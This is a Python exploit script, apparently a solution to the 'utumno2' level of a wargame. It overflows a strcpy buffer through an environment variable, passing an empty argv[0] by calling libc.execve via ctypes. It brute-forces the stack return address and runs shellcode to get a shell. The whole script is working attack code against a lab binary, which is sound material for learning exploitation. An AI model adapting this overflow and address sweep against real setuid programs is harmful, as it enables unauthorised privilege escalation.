import ctypes, os, struct, sys, time

# ---------------------------------------------------------------------------
# utumno2's main():
#     if (argc == 1 && argv[0][0] == 0) { ... }   /* the "no arguments" path */
#     strcpy(buffer, argv[10]);                  /* argv + 0x28 */
#
# Two things make this exploitable:
#   * the guard only lets us through when argv[0] is the EMPTY string, which
#     Python's os.execve refuses to build ("argv first element cannot be
#     empty"), so we call libc.execve directly through ctypes;
#   * argv[10] is past the end of argv when argc is 1.  The kernel lays the
#     environment immediately after the argv array, so argv[10] is really
#     envp[8] -- the value of the 9th environment variable.  That gives us a
#     full attacker-controlled string to copy, with no NUL restriction on the
#     part after the '=' (envp strings are C strings, so only the last byte
#     must be non-NUL).
# ---------------------------------------------------------------------------
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.execve.argtypes = [ctypes.c_char_p,
                        ctypes.POINTER(ctypes.c_char_p),
                        ctypes.POINTER(ctypes.c_char_p)]

sc = open("/tmp/uu2/sc.bin", "rb").read()
print("shellcode: %d bytes, NUL: %s" % (len(sc), b"\x00" in sc), flush=True)

# buffer is 12 bytes at ebp-0xc: 0..11 fill it, 12..15 saved ebp, 16..19 return
def payload_for(addr):
    return b"E08=" + b"\x90" * 8 + b"B" * 4 + struct.pack("<I", addr) + sc

def env_for(payload):
    envl = [("E%02d" % i).encode() + b"=" + b"A" * 4 for i in range(20)]
    envl[8] = payload
    return (ctypes.c_char_p * (len(envl) + 1))(*envl, None)

def run(addr):
    """Run the target with this return address and capture its output."""
    r, w = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(r)
        os.dup2(w, 1); os.dup2(w, 2); os.close(w)
        devnull = os.open("/dev/null", os.O_RDONLY); os.dup2(devnull, 0)
        libc.execve(b"/utumno/utumno2", (ctypes.c_char_p * 2)(b"", None),
                    env_for(payload_for(addr)))
        os._exit(1)
    os.close(w)
    out = b""
    end = time.time() + 0.4
    while time.time() < end:
        try:
            chunk = os.read(r, 4096)
        except OSError:
            break
        if not chunk:
            break
        out += chunk
    os.close(r)
    os.waitpid(pid, 0)
    return out

print("sweeping return addresses 0xffffd000..0xffffe800 for the PWN! marker", flush=True)
found = None
for addr in range(0xffffd000, 0xffffe800, 4):
    if 0 in struct.pack("<I", addr):      # the env value cannot carry a NUL
        continue
    if b"PWN" in run(addr):
        found = addr
        print("HIT at %#x" % addr, flush=True)
        break
if found is None:
    print("no address landed in the sled")
    sys.exit(1)

print("re-running %#x with the shell commands" % found, flush=True)
# os.execve wants a tuple/list of bytes, and it refuses an empty argv[0];
# libc.execve takes the raw pointer array, so it can build argv[0] = "".
libc.execve(b"/utumno/utumno2", ctypes.cast((ctypes.c_char_p * 2)(b"", None),
                                           ctypes.POINTER(ctypes.c_char_p)),
            env_for(payload_for(found)))
